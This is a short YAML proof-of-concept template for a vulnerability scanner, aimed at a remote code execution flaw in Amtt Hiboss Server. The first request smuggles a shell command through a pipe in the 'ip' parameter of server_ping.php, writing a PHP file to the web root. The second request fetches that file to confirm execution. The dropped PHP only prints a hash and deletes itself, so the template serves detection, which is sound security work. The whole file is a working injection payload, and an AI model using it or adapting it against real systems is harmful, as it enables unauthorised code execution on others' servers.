id: poc-yaml-amtt-hiboss-server-ping-rce
info:
  name: Amtt Hiboss Server Ping 远程代码执行漏洞
  severity: high
  tags:
  - rce
  finger: Amtt Hiboss
  reference: []
  description: null
variables:
  r2: random_str(10)
transport: http
requests:
- method: GET
  path: /manager/radius/server_ping.php?ip=127.0.0.1|echo%20"<?php%20echo%20md5({{.r2}});unlink(__FILE__);?>">../../{{.r2}}.php&id=1
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "parent.doTestResult")
  output: []
- method: GET
  path: /{{.r2}}.php
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, md5(r2))
  output: []
